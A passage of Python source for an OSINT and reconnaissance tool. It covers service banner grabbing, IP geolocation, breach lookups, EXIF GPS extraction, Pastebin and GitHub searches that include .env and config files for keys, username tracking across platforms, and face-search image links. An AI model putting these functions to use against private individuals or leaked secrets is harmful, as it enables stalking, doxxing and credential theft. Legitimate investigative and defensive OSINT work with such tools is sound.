        143: ["IMAP", "IMAP", "Dovecot", "Cyrus", "Exchange"],
        443: ["HTTPS", "Apache", "Nginx", "IIS", "cloudflare"],
        445: ["SMB", "Samba", "Windows"],
        3306: ["MySQL", "MySQL", "MariaDB"],
        5432: ["PostgreSQL", "PostgreSQL"],
        5900: ["VNC", "VNC", "RFB", "TightVNC", "RealVNC"],
        6379: ["Redis", "Redis"],
        8080: ["HTTP-Alt", "Apache", "Nginx", "Tomcat", "Jetty"],
        8443: ["HTTPS-Alt", "Apache", "Nginx", "Tomcat"],
    }

    def detect(self, ip: str, port: int, banner: str = "") -> str:
        service = self.SIGNATURES.get(port, ["unknown"])[0]
        if banner:
            for sig_list in self.SIGNATURES.values():
                for sig in sig_list:
                    if sig.lower() in banner.lower():
                        return sig_list[0]
        if port in self.SIGNATURES:
            return self.SIGNATURES[port][0]
        try: return socket.getservbyport(port, "tcp")
        except: return "unknown"

    def detect_all(self, ip: str, open_ports: Dict) -> Dict:
        results = {}
        grabber = BannerGrabber()
        for port, service in open_ports.items():
            banner_info = grabber.grab(ip, port)
            banner = banner_info.get("banner", "")
            detected = self.detect(ip, port, banner)
            results[port] = {
                "service": detected,
                "banner": banner[:200] if banner else "",
                "protocol": banner_info.get("protocol", "tcp"),
            }
        return results


def randomize_scan_order(ports: List[int], seed: int = None) -> List[int]:
    import random as _r
    if seed: _r.seed(seed)
    shuffled = ports[:]
    _r.shuffle(shuffled)
    return shuffled



def get_ip_info(ip: str) -> Dict:
    session = get_session()
    enriched = {}
    try:
        response = session.get(f"http://ipwho.is/{ip}", timeout=CONFIG["request_timeout"])
        data = response.json()
        enriched.update(data)
        enriched["_source"] = "ipwho.is"
        if "security" in data:
            sec = data["security"]
            enriched["is_proxy"] = sec.get("proxy", False)
            enriched["is_vpn"] = sec.get("vpn", False)
            enriched["is_tor"] = sec.get("tor", False)
            enriched["is_hosting"] = sec.get("hosting", False)
            enriched["threat_score"] = sec.get("threat_score", 0)
        if "asn" in data:
            asn_data = data["asn"]
            enriched["asn_route"] = asn_data.get("route", "N/A")
            enriched["asn_domain"] = asn_data.get("domain", "N/A")
            enriched["asn_type"] = asn_data.get("type", "N/A")
    except:
        try:
            response = session.get(f"http://ip-api.com/json/{ip}", timeout=CONFIG["request_timeout"])
            data = response.json()
            enriched.update(data)
            enriched["_source"] = "ip-api.com"
        except:
            return {}
    try:
        host = socket.gethostbyaddr(ip)
        enriched["reverse_dns"] = host[0]
        enriched["reverse_aliases"] = host[1]
    except:
        enriched["reverse_dns"] = "N/A"
    return enriched

def check_ip_abuse(ip: str) -> Dict:
    result = {"reports": 0, "confidence": 0, "categories": [], "last_reported": "N/A"}
    try:
        resp = requests.get(f"https://www.abuseipdb.com/check/{ip}", headers={"User-Agent": random.choice(CONFIG["user_agents"])}, timeout=8)
        if resp.status_code == 200:
            conf = re.search(r'Confidence[^<]*<[^>]*>(\d+)', resp.text, re.I)
            if conf:
                result["confidence"] = int(conf.group(1))
            reports = re.search(r'Report[s]?[^<]*<[^>]*>(\d+)', resp.text, re.I)
            if reports:
                result["reports"] = int(reports.group(1))
            cats = re.findall(r'category[^<]*<[^>]*>([^<]+)', resp.text, re.I)
            if cats:
                result["categories"] = [c.strip() for c in cats[:5]]
    except:
        pass
    return result

def check_email_breach(email: str) -> Dict:
    try:
        response = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", 
                                headers={"hibp-api-key": ""}, timeout=10)
        if response.status_code == 200:
            return {"breached": True, "sites": response.json()}
        elif response.status_code == 404:
            return {"breached": False, "sites": []}
    except:
        pass
    return {"breached": "unknown", "sites": []}

def extract_metadata(filepath: str) -> Dict:
    metadata = {}
    fname = filepath.lower()
    
    try:
        if fname.endswith(('.png', '.jpg', '.jpeg', '.tiff', '.bmp', '.webp')):
            image = Image.open(filepath)
            exifdata = image.getexif()
            for tag_id, value in exifdata.items():
                tag = TAGS.get(tag_id, tag_id)
                if isinstance(value, bytes):
                    try:
                        value = value.decode('utf-8', errors='replace')
                    except:
                        value = str(value)
                metadata[tag] = str(value)
            
            metadata["File_Size_Bytes"] = str(os.path.getsize(filepath)) + " bytes"
            metadata["Image_Format"] = image.format or "N/A"
            metadata["Image_Dimensions"] = f"{image.width}x{image.height}"
            metadata["Color_Mode"] = image.mode
            
            gps_info = exifdata.get_ifd(0x8825) if hasattr(exifdata, 'get_ifd') else None
            if gps_info:
                def dms_to_dd(dms, ref):
                    try:
                        degrees = float(dms[0])
                        minutes = float(dms[1])
                        seconds = float(dms[2])
                        dd = degrees + minutes/60.0 + seconds/3600.0
                        if ref in ('S', 'W'):
                            dd = -dd
                        return dd
                    except:
                        return None
                from PIL.ExifTags import GPSTAGS
                gps = {}
                for k, v in gps_info.items():
                    tag = GPSTAGS.get(k, k)
                    gps[tag] = v
                lat_dms = gps.get('GPSLatitude')
                lat_ref = gps.get('GPSLatitudeRef', 'N')
                lon_dms = gps.get('GPSLongitude')
                lon_ref = gps.get('GPSLongitudeRef', 'E')
                if lat_dms and lon_dms:
                    lat = dms_to_dd(lat_dms, lat_ref)
                    lon = dms_to_dd(lon_dms, lon_ref)
                    if lat and lon:
                        metadata["GPS_Coordinates"] = f"{lat}, {lon}"
                        metadata["GPS_Latitude"] = str(lat)
                        metadata["GPS_Longitude"] = str(lon)
                        metadata["Google_Maps_URL"] = f"https://www.google.com/maps?q={lat},{lon}"
                        metadata["Google_Maps"] = f"https://www.google.com/maps?q={lat},{lon}"
                        metadata["OpenStreetMap"] = f"https://www.openstreetmap.org/?mlat={lat}&mlon={lon}&zoom=15"
    except:
        pass
    
    try:
        if fname.endswith('.pdf'):
            import subprocess
            result = subprocess.run(['pdfinfo', filepath], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if ':' in line:
                        key, val = line.split(':', 1)
                        metadata[key.strip()] = val.strip()
            else:
                with open(filepath, 'rb') as f:
                    content = f.read(1000)
                    author = re.search(rb'/Author\(([^)]*)\)', content)
                    if author:
                        metadata["Author"] = author.group(1).decode('latin-1', errors='replace')
                    title = re.search(rb'/Title\(([^)]*)\)', content)
                    if title:
                        metadata["Title"] = title.group(1).decode('latin-1', errors='replace')
                    producer = re.search(rb'/Producer\(([^)]*)\)', content)
                    if producer:
                        metadata["Producer"] = producer.group(1).decode('latin-1', errors='replace')
    except:
        pass
    
    try:
        if fname.endswith(('.docx', '.xlsx', '.pptx')):
            import zipfile
            import xml.etree.ElementTree as ET
            with zipfile.ZipFile(filepath) as z:
                if 'docProps/core.xml' in z.namelist():
                    core = z.read('docProps/core.xml').decode('utf-8', errors='replace')
                    for tag in ['title', 'creator', 'lastModifiedBy', 'created', 'modified', 'subject']:
                        match = re.search(f'<[^:]*:{tag}[^>]*>(.*?)</[^:]*:{tag}>', core, re.I)
                        if match:
                            metadata[tag.capitalize()] = match.group(1).strip()
                if 'docProps/app.xml' in z.namelist():
                    app = z.read('docProps/app.xml').decode('utf-8', errors='replace')
                    for tag in ['Application', 'Company', 'TotalTime', 'Pages', 'Words']:
                        match = re.search(f'<{tag}[^>]*>(.*?)</{tag}>', app)
                        if match:
                            metadata[tag] = match.group(1).strip()
    except:
        pass
    
    return metadata

def dns_lookup(domain: str) -> Dict:
    results = {}
    try:
        results["A"] = socket.gethostbyname(domain)
    except:
        results["A"] = "Not found"
    
    try:
        results["Aliases"] = socket.gethostbyname_ex(domain)[0] or "None"
        ips = socket.gethostbyname_ex(domain)[2]
        results["All A Records"] = ips
    except:
        results["Aliases"] = "Not found"
    
    return results

def dns_records_full(domain: str) -> Dict:
    records = {}
    try:
        records["A"] = socket.gethostbyname(domain)
    except:
        records["A"] = "N/A"
    
    try:
        import subprocess
        for rtype in ["NS", "MX", "TXT", "SOA"]:
            try:
                result = subprocess.run(['nslookup', f'-type={rtype}', domain], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                relevant = [l.strip() for l in lines if domain.lower() in l.lower() or '=' in l]
                if relevant:
                    records[rtype] = relevant[:5]
            except:
                records[rtype] = []
    except:
        pass
    return records

def check_ssl_cert(domain: str) -> Dict:
    info = {}
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with ctx.wrap_socket(socket.socket(socket.AF_INET), server_hostname=domain) as s:
            s.settimeout(5)
            s.connect((domain, 443))
            cert = s.getpeercert()
            if cert:
                info["Issuer"] = dict(cert.get("issuer", [])).get("organizationName", "N/A")
                info["Subject"] = dict(cert.get("subject", [])).get("commonName", "N/A")
                info["Expiry"] = cert.get("notAfter", "N/A")
                info["SAN"] = cert.get("subjectAltName", [])[0][1] if cert.get("subjectAltName") else "N/A"
    except:
        info["error"] = "No SSL/HTTPS"
    return info

def whois_lookup(domain: str) -> Dict:
    try:
        import subprocess
        result = subprocess.run(['whois', domain], capture_output=True, text=True, timeout=10)
        lines = result.stdout.split('\n')[:20]
        return {"raw": '\n'.join(lines)}
    except:
        return {"error": "Whois not available"}

def wayback_check(url: str) -> Dict:
    try:
        archive_url = f"https://archive.org/wayback/available?url={url}"
        response = requests.get(archive_url, timeout=10)
        data = response.json()
        if data.get("archived_snapshots"):
            snapshot = data["archived_snapshots"]["closest"]
            return {
                "available": True,
                "timestamp": snapshot.get("timestamp"),
                "url": snapshot.get("url")
            }
    except:
        pass
    return {"available": False}

def pastebin_search(keyword: str) -> Dict:
    results = {"psbdmp": [], "pastebin_direct": [], "github_gists": [], "pastebin_raw": []}
    
    try:
        search_url = f"https://psbdmp.ws/api/search/{keyword}"
        response = requests.get(search_url, timeout=10)
        data = response.json()
        for item in data.get("data", [])[:15]:
            pid = item['id']
            results["psbdmp"].append(f"https://pastebin.com/{pid}")
            results["pastebin_raw"].append(f"https://pastebin.com/raw/{pid}")
    except:
        pass
    
    try:
        for query in [f"site:pastebin.com {keyword}", f"site:pastebin.com/raw {keyword}"]:
            resp = requests.get(f"https://www.google.com/search?q={query}", 
                              headers={"User-Agent": random.choice(CONFIG["user_agents"])}, timeout=10)
            paste_links = re.findall(r'https://pastebin\.com/[a-zA-Z0-9]{8}', resp.text)
            results["pastebin_direct"] = list(set(results["pastebin_direct"] + paste_links))[:8]
    except:
        pass
    
    try:
        resp = requests.get(f"https://api.github.com/search/code?q={keyword}+extension:txt+org:gist",
                          timeout=10)
        if resp.status_code == 200:
            gist_data = resp.json()
            for item in gist_data.get("items", [])[:8]:
                results["github_gists"].append(item.get("html_url", ""))
    except:
        pass
    
    try:
        resp = requests.get(f"https://api.github.com/search/code?q={keyword}+extension:json+org:gist",
                          timeout=10)
        if resp.status_code == 200:
            gist_data = resp.json()
            for item in gist_data.get("items", [])[:5]:
                results["github_gists"].append(item.get("html_url", ""))
    except:
        pass
    
    results["pastebin_direct"] = list(set(results["pastebin_direct"]))
    results["github_gists"] = list(set(results["github_gists"]))
    results["pastebin_raw"] = list(set(results["pastebin_raw"]))
    return results

def check_vpn_proxy(ip: str) -> Dict:
    try:
        response = requests.get(f"http://ipwho.is/{ip}", timeout=10)
        data = response.json()
        return {
            "proxy": data.get("proxy", False),
            "type": data.get("type", "unknown")
        }
    except:
        return {"proxy": "unknown", "type": "unknown"}

def github_search(keyword: str) -> Dict:
    results = {"users": [], "repos": [], "code": [], "emails": []}
    
    try:
        url = f"https://api.github.com/search/users?q={keyword}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            for item in data.get("items", [])[:10]:
                user_data = {
                    "login": item.get("login"),
                    "id": item.get("id"),
                    "type": item.get("type"),
                    "url": item.get("html_url"),
                    "avatar": item.get("avatar_url"),
                    "score": item.get("score", 0),
                }
                results["users"].append(user_data)
                if item.get("type") == "User":
                    try:
                        ud = requests.get(item.get("url"), timeout=5).json()
                        if ud.get("email"):
                            results["emails"].append({"user": item["login"], "email": ud["email"]})
                        if ud.get("bio"):
                            user_data["bio"] = ud.get("bio", "")[:100]
                        if ud.get("company"):
                            user_data["company"] = ud.get("company")
                        if ud.get("location"):
                            user_data["location"] = ud.get("location")
                        if ud.get("blog"):
                            user_data["blog"] = ud.get("blog")
                    except:
                        pass
    except:
        pass
    
    try:
        url = f"https://api.github.com/search/repositories?q={keyword}&sort=stars&order=desc"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            for item in data.get("items", [])[:8]:
                results["repos"].append({
                    "name": item.get("full_name"),
                    "description": item.get("description", "")[:100],
                    "stars": item.get("stargazers_count", 0),
                    "forks": item.get("forks_count", 0),
                    "language": item.get("language", "N/A"),
                    "topics": item.get("topics", [])[:4],
                    "url": item.get("html_url"),
                    "created": item.get("created_at", "")[:10],
                    "updated": item.get("updated_at", "")[:10],
                })
    except:
        pass
    
    try:
        for query in [f"{keyword}+in:file", f"{keyword}+extension:env", f"{keyword}+extension:config"]:
            url = f"https://api.github.com/search/code?q={query}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                for item in data.get("items", [])[:4]:
                    results["code"].append({
                        "repository": item.get("repository", {}).get("full_name"),
                        "file": item.get("name"),
                        "path": item.get("path"),
                        "url": item.get("html_url")
                    })
    except:
        pass
    
    results["users"] = results["users"][:10]
    results["repos"] = results["repos"][:8]
    results["code"] = results["code"][:8]
    return results

def check_email_domain(domain: str) -> Dict:
    info = {}
    try:
        info["MX Records"] = []
        _, _, ips = socket.gethostbyname_ex(domain)
        info["A Records"] = ips
    except:
        info["A Records"] = []
    try:
        import subprocess
        result = subprocess.run(['nslookup', '-type=MX', domain], capture_output=True, text=True, timeout=5)
        mx_lines = [l for l in result.stdout.split('\n') if 'mail exchanger' in l.lower()]
        info["MX Records"] = [l.split('=')[-1].strip() for l in mx_lines[:5]] if mx_lines else []
    except:
        pass
    return info

def metadata_extractor():
    filepath = input(f"\n{Wh}[?] Enter file path {Gr}[image, PDF, or document]{Wh}: {Gr}").strip()
    
    if not os.path.exists(filepath):
        print(f"{R}[!] File not found!")
        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
        return
    
    print(f"\n {Wh}{'='*50}")
    print(f" {R}METADATA EXTRACTION")
    print(f" {Wh}{'='*50}")
    
    metadata = extract_metadata(filepath)
    file_size = os.path.getsize(filepath)
    
    print(f"{Wh} File            : {Gr}{os.path.basename(filepath)}")
    print(f"{Wh} Size            : {Gr}{file_size:,} bytes")
    print(f"{Wh} Last Modified   : {Gr}{datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat()}")
    
    if metadata:
        print(f"\n{Gr}[+] Metadata found ({len(metadata)} fields):{Wh}")
        important_keys = ["GPS Latitude", "GPS Longitude", "Google Maps", "OpenStreetMap",
                         "Make", "Model", "Software", "DateTimeOriginal", "CreateDate",
                         "Artist", "Copyright", "Author", "Creator", "Title", "Company",
                         "Application", "Image Size", "Image Format"]
        shown = set()
        for key in important_keys:
            if key in metadata:
                if key in ("Google Maps", "OpenStreetMap"):
                    print(f"    {C}{key}: {metadata[key]}{RS}")
                else:
                    print(f"    {Wh}{key:<20}: {Gr}{metadata[key][:120]}")
                shown.add(key)
        for key, value in metadata.items():
            if key not in shown:
                print(f"    {Wh}{key:<20}: {Gr}{value[:120]}")
    else:
        print(f"{Y}[!] No metadata found or format not supported")
    
    data = {"file": filepath, "size": file_size, "metadata": metadata}
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="metadata",
        target=filepath,
        data=data
    )
    save_report(result)
    input(f"\n{Wh}[+{Wh}] Press Enter to continue")

def reputation_engine_menu():
    print(f"\n {Wh}{'='*50}")
    print(f" {R} REPUTATION ENGINE - التهديف الذكي")
    print(f" {Wh}{'='*50}")
    print(f"{Wh}[*] يقيم المخاطر من 0-100 بناءً على عوامل متعددة{Wh}")
    
    target_type = input(f"\n{Wh}[?] نوع الاستهداف: {Gr}(1) IP  (2) Email  (3) Username{Wh}: {Gr}").strip()
    target = input(f"{Wh}[?] أدخل القيمة: {Gr}").strip()
    if not target:
        print(f"{R}[!] الإدخال فارغ!")
        input(f"\n{Wh}[+{Wh}] Press Enter")
        return
    
    engine = ReputationEngine()
    payload = {'results': {}}
    
    if target_type == '1':
        print(f"{Y}[*] جلب معلومات IP للتحليل...{Wh}")
        ip_data = get_ip_info(target)
        ip_reputation = check_ip_reputation_free(target)
        payload['results'] = {
            'vpn_proxy': {'is_vpn': ip_reputation.get('is_vpn', False)},
            'blacklist': ['listed'] if ip_reputation.get('blacklists') else []
        }
    elif target_type == '2':
        print(f"{Y}[*] التحقق من خروقات البريد...{Wh}")
        breach_data = check_email_breach(target)
        payload['results'] = {
            'breaches': breach_data.get('sites', []) if breach_data.get('breached') else []
        }
    elif target_type == '3':
        print(f"{Y}[*] البحث عن username في المنصات...{Wh}")
        session = get_session()
        platforms_check = [
            {"url": "https://www.github.com/{}", "name": "GitHub"},
            {"url": "https://www.reddit.com/user/{}", "name": "Reddit"},
        ]
        platform_results = []
        for site in platforms_check:
            try:
                resp = session.get(site['url'].format(target), timeout=5)
                body = resp.text[:500].lower() if resp.status_code == 200 else ""
                patterns = NOT_FOUND_PATTERNS.get(site['name'], [])
                not_found = any(p in body for p in patterns) if patterns else False
                platform_results.append({'name': site['name'], 'exists': resp.status_code == 200 and not not_found})
            except:
                platform_results.append({'name': site['name'], 'exists': False})
        payload['results'] = platform_results
    
    result = engine.score(payload)
    
    risk_colors = {'CRITICAL': R, 'HIGH': Y, 'MEDIUM': Y, 'LOW': Gr}
    
    print(f"\n {Wh}{'='*50}")
    print(f" {R} RESULTAT DU SCORE")
    print(f" {Wh}{'='*50}")
    print(f"{Wh} Score Final     : {risk_colors.get(result['risk_level'], Wh)}{result['score']}/100{RS}")
    print(f"{Wh} Risk Level      : {risk_colors.get(result['risk_level'], Wh)}{result['risk_level']}{RS}")
    if result['factors']:
        print(f"{Wh} Factors         : {Gr}{', '.join(result['factors'])}{RS}")
    
    risk_desc = {
        'CRITICAL': 'مخاطرة عالية جداً - probablement dangereux',
        'HIGH': 'مخاطرة عالية - nécessite attention',
        'MEDIUM': 'مخاطرة متوسطة - peut être suspect',
        'LOW': 'مخاطرة منخفضة - semble sûr'
    }
    print(f"{Wh} Description     : {Y}{risk_desc.get(result['risk_level'], '')}{RS}")
    
    scan_result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="reputation",
        target=target,
        data={"score": result['score'], "risk_level": result['risk_level'], "factors": result['factors']}
    )
    save_report(scan_result)
    input(f"\n{Wh}[+{Wh}] Press Enter")

def pastebin_osint():
    keyword = input(f"\n{Wh}[?] Enter keyword to search in pastes{Wh}: {Gr}").strip()
    if not keyword:
        print(f"{R}[!] Keyword cannot be empty!")
        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
        return
    
    print(f"\n {Wh}{'='*50}")
    print(f" {R}PASTEBIN OSINT SEARCH")
    print(f" {Wh}{'='*50}")
    
    print(f"{Y}[*] Searching across multiple sources...{Wh}")
    paste_data = pastebin_search(keyword)
    
    total = sum(len(v) for v in paste_data.values())
    
    if paste_data.get("psbdmp"):
        print(f"\n{Gr}[+] psbdmp.ws results ({len(paste_data['psbdmp'])}):{Wh}")
        for i, p in enumerate(paste_data["psbdmp"][:8], 1):
            print(f"    {Wh}{i}. {C}{p}{RS}")
        if len(paste_data["psbdmp"]) > 8:
            raw_links = paste_data.get("pastebin_raw", [])
            if raw_links:
                print(f"    {Y}Raw content links:{Wh}")
                for r in raw_links[:3]:
                    print(f"       {C}{r}{RS}")
            if len(paste_data["psbdmp"]) > 8:
                print(f"    {Y}... and {len(paste_data['psbdmp'])-8} more")
    
    if paste_data.get("pastebin_direct"):
        print(f"\n{Gr}[+] Google indexed pastes ({len(paste_data['pastebin_direct'])}):{Wh}")
        for p in paste_data["pastebin_direct"]:
            print(f"    {Wh}- {C}{p}{RS}")
    
    if paste_data.get("github_gists"):
        print(f"\n{Gr}[+] GitHub Gists ({len(paste_data['github_gists'])}):{Wh}")
        for p in paste_data["github_gists"]:
            print(f"    {Wh}- {C}{p}{RS}")
    
    if total == 0:
        print(f"{Y}[!] No pastes found for '{keyword}'")
    
    data = {"keyword": keyword, "sources": paste_data, "total": total}
    
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="pastebin",
        target=keyword,
        data=data
    )
    save_report(result)
    input(f"\n{Wh}[+{Wh}] Press Enter to continue")

def github_osint():
    keyword = input(f"\n{Wh}[?] Enter keyword to search on GitHub {Gr}[e.g., username, api_key]{Wh}: {Gr}").strip()
    if not keyword:
        print(f"{R}[!] Keyword cannot be empty!")
        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
        return
    
    print(f"\n {Wh}{'='*50}")
    print(f" {R}GITHUB OSINT SEARCH")
    print(f" {Wh}{'='*50}")
    
    print(f"{Y}[*] Searching GitHub users, repos, and code...{Wh}")
    results = github_search(keyword)
    
    total = sum(len(v) for v in results.values())
    
    if results.get("users"):
        print(f"\n{Gr}[+] Users ({len(results['users'])}):{Wh}")
        for u in results["users"]:
            extra = ""
            if u.get("bio"):
                extra += f" | Bio: {u['bio'][:50]}"
            if u.get("location"):
                extra += f" | Location: {u['location']}"
            if u.get("company"):
                extra += f" | Company: {u['company']}"
            if u.get("email"):
                extra += f" | Email: {u['email']}"
            print(f"    {Wh}- {C}{u['login']:<20}{RS} {Wh}ID: {u['id']}{extra}{RS}")
            print(f"      {C}{u['url']}{RS}")
    
    if results.get("emails"):
        print(f"\n{Gr}[+] Emails found in profiles:{Wh}")
        for e in results["emails"]:
            print(f"    {Wh}- {C}{e['user']:<20}{RS} : {Gr}{e['email']}{RS}")
    
    if results.get("repos"):
        print(f"\n{Gr}[+] Repositories ({len(results['repos'])}):{Wh}")
        for r in results["repos"]:
            extra = ""
            if r.get("language") and r["language"] != "N/A":
                extra += f" | Lang: {r['language']}"
            if r.get("forks"):
                extra += f" | Forks: {r['forks']}"
            stars = f"{r['stars']}" if r['stars'] else ""
            print(f"    {Wh}- {C}{r['name']:<30}{RS} {Y}{stars}{RS}{extra}")
            if r.get("description"):
                print(f"      {Wh}{r['description'][:80]}")
            if r.get("topics"):
                print(f"      {Wh}Topics: {', '.join(r['topics'])}")
    
    if results.get("code"):
        print(f"\n{Gr}[+] Code matches ({len(results['code'])}):{Wh}")
        for c in results["code"]:
            print(f"    {Wh}- {C}{c['repository']}/{c['file']}{RS}")
            print(f"      {C}{c['url']}{RS}")
    
    if total == 0:
        print(f"{Y}[!] No GitHub results found for '{keyword}'")
    
    data = {"keyword": keyword, "results": results}
    
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="github",
        target=keyword,
        data=data
    )
    save_report(result)
    input(f"\n{Wh}[+{Wh}] Press Enter to continue")

def showIP():
    print(f"\n {Wh}{'='*50}")
    print(f" {R}YOUR IP INFORMATION")
    print(f" {Wh}{'='*50}")
    
    try:
        session = get_session()
        response = session.get('https://api.ipify.org/', timeout=CONFIG["request_timeout"])
        my_ip = response.text.strip()
        print(f"{Wh} Your IP Address : {Gr}{my_ip}")
        
        geo_response = session.get(f"http://ipwho.is/{my_ip}", timeout=CONFIG["request_timeout"])
        geo_data = geo_response.json()
        
        print(f"{Wh} Location       : {Gr}{geo_data.get('city', 'N/A')}, {geo_data.get('country', 'N/A')}")
        print(f"{Wh} ISP            : {Gr}{geo_data.get('connection', {}).get('isp', 'N/A')}")
        print(f"{Wh} Timezone       : {Gr}{geo_data.get('timezone', {}).get('id', 'N/A')}")
        
    except Exception as e:
        print(f"{R}[!] Error: {e}")
    
    input(f"\n{Wh}[+{Wh}] Press Enter to continue")

NOT_FOUND_PATTERNS = {
    "Facebook": ["this content isn't available", "page not found", "this page isn't available", "wasn't sent to this person", "couldn't find that page", "content not found"],
    "Twitter/X": ["this account doesn't exist", "page doesn't exist", "this account has been suspended", "this account doesn\u2019t exist", "no longer exists", "user not found"],
    "Instagram": ["this page isn't available", "page not found", "sorry, this page", "the link you followed may be broken", "this account doesn't exist", "this page is no longer available", "please try again later"],
    "TikTok": ["couldn't find this account", "this account doesn't exist", "page not found", "this user doesn't exist", "no results found", "user not found"],
    "Snapchat": ["couldn't find", "this username doesn't exist", "page not found", "sorry, we could not find that user"],
    "Medium": ["page not found", "this page doesn't exist", "not found"],
    "Twitch": ["page not found", "this channel doesn't exist", "hasn't created their channel yet", "sorry. unless you\u2019ve got a time machine"],
    "Pinterest": ["user not found", "page not found", "this profile doesn't exist", "doesn't exist"],
    "Reddit": ["page not found", "this user has deleted their account", "this account has been suspended", "that user doesn't exist"],
    "YouTube": ["this channel doesn't exist", "not found", "this page isn't available", "this channel isn't available"],
    "Spotify": ["page not found", "user not found", "not found"],
    "LinkedIn": ["page not found", "this profile doesn't exist", "page doesn't exist", "this page doesn\u2019t exist"],
    "AboutMe": ["page not found", "this profile doesn't exist", "that profile doesn't exist"],
    "Behance": ["page not found", "this user doesn't exist", "page you requested was not found"],
    "Dribbble": ["page not found", "this user doesn't exist", "whoops"],
    "Flickr": ["this account doesn't exist", "page not found", "sorry, we couldn\u2019t find that page"],
    "Keybase": ["user not found", "page not found"],
    "Mastodon": ["page not found", "this account doesn't exist", "no account with that username"],
    "Telegram": ["sorry, this username doesn't exist", "page not found"],
    "Discord": ["page not found", "no results found"],
    "Wattpad": ["page not found", "user not found"],
    "VK": ["page not found", "this page doesn't exist", "user not found"],
    "Mixcloud": ["page not found", "user not found", "this page doesn't exist"],
    "Steam": ["page not found", "the specified profile could not be found"],
    "SoundCloud": ["page not found", "we can\u2019t find that page", "user not found"],
    "TryHackMe": ["page not found", "user not found"],
    "HackerNews": ["page not found", "no such user"],
}

def TrackLu():
    username = input(f"\n{Wh}[?] Enter username to track {Gr}[e.g., john_doe]{Wh}: {Gr}").strip()
    if not username:
        print(f"{R}[!] Username cannot be empty!")
        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
        return

    print(f"\n {Wh}{'='*50}")
    print(f" {R}USERNAME TRACKER - SUPER ENGINE")
    print(f" {Wh}{'='*50}")
    print(f"{Wh}[!] اختر وضع المسح:{Wh}")
    print(f"    1. سريع (50 منصة مع تقييم 0-100)")
    print(f"    2. عميق (350+ موقع - WhatsMyName)")
    print(f"    3. الاثنين معاً (كامل)")
    mode = input(f"\n{Wh}[?] اختر {Gr}[1-3]{Wh}: {Gr}").strip()

    all_results = {}

    if mode in ("1", "3"):
        print(f"\n{Y}[*] تشغيل المسح السريع مع التقييم الذكي...{Wh}")
        TrackLu_Enhanced(username)

    if mode in ("2", "3"):
        print(f"\n{Y}[*] تشغيل المسح العميق عبر 350+ موقع...{Wh}")
        TrackLu_Super(username)

    if mode not in ("1", "2", "3"):
        print(f"{R}[!] اختيار غير صحيح! تشغيل الوضع الافتراضي (سريع){Wh}")
        TrackLu_Enhanced(username)

    input(f"\n{Wh}[+{Wh}] Press Enter to continue")

class AdvancedImageSearch:
    def __init__(self):
        self.search_engines = {
            'google': 'https://lens.google.com/upload?url={}',
            'yandex': 'https://yandex.com/images/search?url={}',
            'tineye': 'https://tineye.com/search?url={}',
            'bing': 'https://www.bing.com/images/search?q=imgurl:{}',
            'saucenao': 'https://saucenao.com/search.php?url={}',
            'iqdb': 'https://iqdb.org/?url={}',
            'pimeyes': 'https://pimeyes.com/en/search?url={}',
            'facecheck': 'https://facecheck.id/search?url={}'
        }
    
    def reverse_search(self, image_path_or_url: str) -> Dict:
        results = {
            'image_hash': self._calculate_hash(image_path_or_url),
            'search_links': {},
            'possible_matches': [],
            'exif_data': {}
        }
        results['image_hash'] = self._calculate_hash(image_path_or_url)
        if os.path.exists(image_path_or_url):
            results['exif_data'] = extract_metadata(image_path_or_url)
        is_url = image_path_or_url.startswith(('http://', 'https://'))
        search_param = image_path_or_url if is_url else f"file://{os.path.abspath(image_path_or_url)}"
        for engine, url_template in self.search_engines.items():
            results['search_links'][engine] = url_template.format(search_param)
        if results['exif_data'].get('GPS_Coordinates'):
            results['possible_matches'].append({
                'source': 'geolocation',
                'confidence': 85,
                'location': results['exif_data']['GPS_Coordinates']
            })
        return results
    
    def _calculate_hash(self, path_or_url: str) -> Dict:
        hashes = {}
        try:
            if path_or_url.startswith(('http://', 'https://')):
                response = requests.get(path_or_url, timeout=10)
                content = response.content
            else:
                with open(path_or_url, 'rb') as f:
                    content = f.read()
            hashes['md5'] = hashlib.md5(content).hexdigest()
            hashes['sha1'] = hashlib.sha1(content).hexdigest()
            hashes['sha256'] = hashlib.sha256(content).hexdigest()
        except:
            pass
        return hashes

def reverse_image():
    print(f"\n {Wh}{'='*50}")
    print(f" {R}REVERSE IMAGE SEARCH (8 ENGINES)")
    print(f" {Wh}{'='*50}")
    
    image_input = input(f"{Wh}[?] Enter image URL or local path: {Gr}").strip()
    
    if not image_input:
        print(f"{R}[!] Please enter a valid input!")
        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
        return
    
    is_local = os.path.exists(image_input)
    
    advanced = AdvancedImageSearch()
    result = advanced.reverse_search(image_input)
    
    engines = [
        {"name": "Google Lens", "url": result['search_links'].get('google', 'N/A')},
        {"name": "Yandex", "url": result['search_links'].get('yandex', 'N/A')},
        {"name": "TinEye", "url": result['search_links'].get('tineye', 'N/A')},
        {"name": "Bing Images", "url": result['search_links'].get('bing', 'N/A')},
        {"name": "SauceNao", "url": result['search_links'].get('saucenao', 'N/A')},
        {"name": "IQDB", "url": result['search_links'].get('iqdb', 'N/A')},
        {"name": "Pimeyes", "url": result['search_links'].get('pimeyes', 'N/A')},
        {"name": "FaceCheck", "url": result['search_links'].get('facecheck', 'N/A')},
    ]
    
    print(f"\n{Y}[*] Image Hashes:{Wh}")
    if result.get('image_hash'):
        for algo, h in result['image_hash'].items():
            print(f"    {Wh}{algo.upper():<8}: {Gr}{h}")
    
    print(f"\n{Y}[*] Open these links in your browser:\n")
    for engine in engines:
